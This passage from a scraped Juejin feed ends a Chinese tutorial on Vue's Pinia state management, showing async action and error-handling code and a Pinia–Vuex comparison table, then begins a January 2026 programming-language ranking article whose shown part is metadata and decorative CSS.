<li><strong>操作集中化</strong>：复杂的业务逻辑放在 actions 中</li>
</ul>
<h3 data-id="heading-20">3. 异步操作处理</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">actions</span>: {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchUserData</span>(<span class="hljs-params">userId</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getUserById</span>(userId)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">user</span> = response.<span class="hljs-property">data</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">error</span> = <span class="hljs-literal">null</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">error</span> = error.<span class="hljs-property">message</span>
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span> = <span class="hljs-literal">false</span>
    }
  }
}
</code></pre>
<h3 data-id="heading-21">4. 错误处理</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">actions</span>: {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">saveData</span>(<span class="hljs-params">data</span>) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">saveData</span>(data)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">savedSuccessfully</span> = <span class="hljs-literal">true</span>
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">errorMessage</span> = error.<span class="hljs-property">message</span>
      <span class="hljs-keyword">throw</span> error  <span class="hljs-comment">// 重新抛出错误以便上层处理</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-22">与 Vuex 的对比</h2>



































<table><thead><tr><th>特性</th><th>Pinia</th><th>Vuex</th></tr></thead><tbody><tr><td>API 复杂度</td><td>简单直观</td><td>相对复杂</td></tr><tr><td>TypeScript 支持</td><td>原生支持</td><td>需要额外配置</td></tr><tr><td>体积</td><td>更小</td><td>较大</td></tr><tr><td>Vue DevTools 支持</td><td>更好</td><td>基础支持</td></tr><tr><td>学习成本</td><td>低</td><td>中等</td></tr></tbody></table>
<h2 data-id="heading-23">总结</h2>
<p>Pinia 作为 Vue 生态的新一代状态管理解决方案，以其简洁的 API、出色的 TypeScript 支持和现代化的设计理念，成为构建 Vue 应用的理想选择。通过合理使用 Pinia，我们可以构建出结构清晰、易于维护的状态管理架构，提升开发效率和应用质量。</p>
<p>在实际项目中，建议根据业务需求合理设计 store 结构，遵循单一职责原则，将相关联的状态组织在一起，同时注意避免 store 之间的过度耦合，保持良好的可维护性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026年1月编程语言排行榜｜C#拿下年度语言，Python稳居第一]]></title>    <link>https://juejin.cn/post/7592997693069623306</link>    <guid>https://juejin.cn/post/7592997693069623306</guid>    <pubDate>2026-01-09T06:40:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592997693069623306" data-draft-id="7592996072705785906" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026年1月编程语言排行榜｜C#拿下年度语言，Python稳居第一"/> <meta itemprop="keywords" content="前端,后端,程序员"/> <meta itemprop="datePublished" content="2026-01-09T06:40:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员凌览"/> <meta itemprop="url" content="https://juejin.cn/user/3350967174565198"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026年1月编程语言排行榜｜C#拿下年度语言，Python稳居第一
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3350967174565198/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员凌览
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:40:40.000Z" title="Fri Jan 09 2026 06:40:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body 